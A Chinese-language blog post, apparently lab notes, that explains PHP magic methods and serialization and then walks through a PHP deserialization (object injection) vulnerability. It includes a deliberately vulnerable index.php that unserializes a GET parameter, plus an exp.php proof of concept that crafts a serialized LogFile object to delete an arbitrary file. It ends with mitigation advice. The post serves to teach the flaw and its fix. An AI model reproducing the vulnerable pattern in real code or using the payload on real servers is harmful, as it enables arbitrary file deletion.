---
title: PHP反序列化漏洞理解与利用
date: 2017-06-15 20:31:56
tags:
- 漏洞复现
categories: 
- 漏洞
---

根据合天实验室上面的实验，我从以前对序列化漏洞的乱七八糟的理解变得清晰起来了。顺便吐槽下最近的自己，没学过java就直接去看struts2的原理性漏洞，头痛。

<!--more-->

### 参考文章：
http://www.tuicool.com/articles/F3iYbaZ
http://blog.csdn.net/qq_32400847/article/details/53873275
http://www.hetianlab.com/expc.do?ce=cb6878ee-c92c-4a7e-bdd1-bb7bf7891f5a



### magic函数


php面向对象编程中有一类特殊的函数叫做magic函数，在特定的条件下会执行这些magic函数的内容，比如创建、销毁对象的时候。
    
> `__construct()`当一个对象创建时调用 (constructor)  
> `__destruct()`当一个对象被销毁时调用 (destructor)  
> `__toString()`当一个对象被当作一个字符串使用  
> `__wakeup()`当一个是字符串被反序列化的时候被调用  
> `__sleep()`当一个对象被序列化的时候被调用

上一段代码来阐述魔法函数到底是咋回事儿。

~~~PHP
<?php
class Test
{     //一个变量（被称为属性）
     public $variable ='This is a string!';
     //一个函数（被称为方法）
     public function PrintVariable()
     {
          echo $this->variable.'<br />';
     }
     //构造函数
     public funtion __construct()
     {
          echo '__construct<br />';
     }
     //析构函数
     public function __destruct()
     {
          echo '__destruct<br />';
     }
     //变成字符串时
     public function __toString()
     {
          return '__toString<br />';
     }
}
//创建对象，__construct会被调用
$object = new Test();

//调用一个方法，方法函数体内的函数会被调用
$object->PrintVariable();

//对象被当成一个字符串，__toString会被调用
echo $object;

//脚本结束，__destruct会被调用 
?>
~~~

验证
![](https://ooo.0o0.ooo/2017/07/02/5958ea16e89e2.png)

### 什么是序列化


PHP （从 PHP 3.05 开始）为保存对象提供了一组序列化和反序列化的函数：serialize、unserialize。不过在 PHP 手册中对这两个函数的说明仅限于如何使用，而对序列化结果的格式却没做任何说明。

把复杂的数据类型压缩到一个字符串中
 
serialize() 把变量和它们的值编码成文本形式
 
unserialize() 恢复原先变量

下面是序列化中字母对应的类型
> a - array 数组  
> b - boolean布尔型  
> d - double双精度型  
> i - integer  
> o - common object一般对象  
> r - reference  
> s - string  
> C - custom object 自定义对象  
> O - class  
> N - null  
> R - pointer reference  
> U - unicode string unicode编码的字符串


1. 序列化数组

~~~PHP
$stooges = array('Moe','Larry','Curly');
$new = serialize($stooges);
print_r($new);
echo "<br />";
print_r(unserialize($new));
~~~

结果：
> a:3:{i:0;s:3:"Moe";i:1;s:5:"Larry";i:2;s:5:"Curly";} //i表示数组第几个，s表示字符个数
Array ( [0] => Moe [1] => Larry [2] => Curly )

当把这些序列化的数据放在URL中在页面之间会传递时，需要对这些数据调用urlencode()，以确保在其中的URL元字符进行处理：

~~~PHP
$shopping = array('Poppy seed bagel' => 2,'Plain Bagel' =>1,'Lox' =>4);
echo '<a href="next.php?cart='.urlencode(serialize($shopping)).'">next</a>';
~~~~

2. 序列化对象


~~~PHP
class User {
    // 类数据

    public $age = 0;
    public $name = '';

    // 输出数据

    public function PrintData() {
        echo 'User ' . $this->name . ' is ' . $this->age
            . ' years old. <br />';
    }
}

// 创建一个对象

$usr = new User();

// 设置数据

$usr->age = 20;
$usr->name = 'John';

// 输出数据

$usr->PrintData();

// 输出序列化之后的数据

echo serialize($usr);
?>
~~~

php允许保存一个对象方便以后重用，这个过程被称为序列化。为什么要有序列化这种机制呢?在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。试想，如果为一个脚本中想要调用之前一个脚本的变量，但是前一个脚本已经执行完毕，所有的变量和内容释放掉了，我们要如何操作呢?难道要前一个脚本不断的循环，等待后面脚本调用?这肯定是不现实的。serialize和unserialize就是用来解决这一问题的。serialize可以将变量转换为字符串，并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串变换回变量。

输出

> O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"John";}
上面就是对象user序列化之后的形式
O表示是对象，4 表示 对象名长度为4，user为对象名

 ![](https://ooo.0o0.ooo/2017/07/02/5958ea2ea508d.jpg)



### PHP反序列化漏洞


这个漏洞的形成是由于跟serialize和unserialize相关的magic函数违背正确利用的缘故。
比如我在第一个板块的 __sleep()和__wakeup()，分别实在一个对象被序列化和反序列化的时候会被调用。

根据参考的文章来验证，给出2个php文件。

logfile.php 删除临时日志文件

~~~PHP
<?php
class LogFile {
    //log文件名
    public $filename = 'error.log';
    //存储日志文件
    public function LogData($text) {
        echo 'Log some data:' . $text . '<br />';
        file_put_contents($this->filename, $text, FILE_APPEND);
    }
    //Destructor删除日志文件
    public function __destruct() {
        echo '__destruct delete' . $this->filename . 'file.<br />';
        unlink(dirname(__FILE__) . '/' . $this->filename); //删除当前目录下的filename这个文件
    }
}
?>
~~~

包含了'logfile.php'的主页面文件index.php

~~~PHP
<?php
include 'logfile.php';

class User {
    //属性
    public $age = 0;
    public $name = '';
    //调用函数来输出类中属性
    public function PrintData() {
        echo 'User' . $this->name . 'is' . $this->age . 'years old.<br />';
    }
}
$usr = unserialize($_GET['user']);
?>
~~~

梳理下这2个php文件的功能，index.php是一个有php序列化漏洞的主业文件，logfile.php的功能就是在临时日志文件被记录了之后调用
`__destruct`方法来删除临时日志的一个php文件。
这个代码写的有点逻辑漏洞的感觉，利用这个漏洞的方式就是，通过构造能够删除source.txt的序列化字符串，然后get方式传入被反序列化函数,反序列化为对象，对象销毁后调用__destruct()来删除source.txt.

#### 漏洞利用
 exp.php为漏洞利用程序（为了得到删除source.txt的序列化字符串）

~~~PHP
<?php
include 'logfile.php';
$obj = new LogFile();
$obj->filename = 'source.txt'; //source.txt为你想删除的文件
echo serialize($obj) . '<br />';
?>
~~~

生成序列化字符串

文件夹底下有这么几个文件
![](https://ooo.0o0.ooo/2017/07/02/5958ea48d7675.png)

GET传入序列化字符串，调用反序列化函数，这个时候source.txt被删除
![](https://ooo.0o0.ooo/2017/07/02/5958ea576aa34.png)

验证
![](https://ooo.0o0.ooo/2017/07/02/5958ea619d961.png)


#### 漏洞修补

由于可以控制的输入造成__destruct()可以删除任意文件，当然__wakeup、__sleep、__toString等magic函数也存在这样的漏洞，这个取决于程序逻辑。
怎么修补这种漏洞呢，首先我们得看出这个漏洞形成的
必要条件

1. unserialize的参数可控
2. 像上面index.php和logfile.php这样的文件里面有可以利用的magic函数
3. 我们构造的exp里有对象的成员变量

这样也导致我们几乎很难在黑盒测试的时候找到并利用这样的漏洞。

防范方法

1. 严格控制输入unserialize函数的参数
2. 对输入的参数进行过滤
